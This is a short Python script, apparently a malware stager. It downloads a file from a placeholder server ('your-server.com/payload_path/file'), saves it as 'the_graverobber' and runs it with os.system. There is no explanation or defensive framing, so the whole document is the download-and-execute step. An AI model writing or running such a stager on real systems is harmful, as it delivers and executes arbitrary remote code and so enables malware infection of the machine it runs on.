import requests
import os

data = requests.get("http://your-server.com/payload_path/file")
with open("the_graverobber", "wb") as fl:
    fl.write(data.content)

os.system("./the_graverobber")
